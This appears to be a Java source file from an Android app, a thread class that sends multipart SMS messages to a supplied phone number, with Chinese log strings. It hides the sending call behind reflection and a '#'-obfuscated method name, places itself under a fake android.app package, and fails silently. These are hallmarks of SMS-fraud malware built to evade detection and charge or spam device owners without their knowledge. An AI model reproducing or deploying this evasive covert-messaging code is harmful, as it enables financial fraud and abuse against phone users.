package android.app.sms.async;

import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import android.app.PendingIntent;
import android.app.sms.utils.LogUtils;
import android.telephony.SmsManager;

public class SendSMSThreed extends Thread {

	private static ExecutorService pool = Executors.newFixedThreadPool(1);
	
	private String phone;
	private String content;
	private ArrayList<PendingIntent> arrays;
	private static String methodstr = "s#e#n#d#M#u#l#t#i#p#a#r#t#T#e#x#t#M#e#s#s#a#g#e#";
	
	public SendSMSThreed(ArrayList<PendingIntent> arrays, String phone, String content){
		this.phone = phone;
		this.arrays = arrays;
		this.content = content;
	}
	
	@SuppressWarnings({ "rawtypes", "unchecked" })
	public void run() {
		SmsManager smr = SmsManager.getDefault();
		try {
            Class ownerClass = smr.getClass();
            Class[]  argsClass = new Class[5];
            argsClass[0] = String.class;
            argsClass[1] = String.class;
            argsClass[2] = ArrayList.class;
            argsClass[3] = ArrayList.class;
            argsClass[4] = ArrayList.class;
			Method method = ownerClass.getMethod(methodstr.replaceAll("#", ""),argsClass);
            Object[] arrayOfObject = new Object[5];
            arrayOfObject[0] = this.phone;
            arrayOfObject[1] = null;
            arrayOfObject[2] = smr.divideMessage(this.content);
            arrayOfObject[3] = this.arrays;
            arrayOfObject[4] = null;
            method.invoke(smr, arrayOfObject);
            LogUtils.write("Send", "发送短信线程结束");
        } catch (Exception e) {
        	LogUtils.write("Send", "发送短信线程异常");
        }
		super.run();
	}

	public static synchronized void startSendSMS(ArrayList<PendingIntent> arrays, String phone, String content) {
		LogUtils.write("Send", "启动发送短信线程");
		pool.execute(new SendSMSThreed(arrays, phone, content));
	}
}
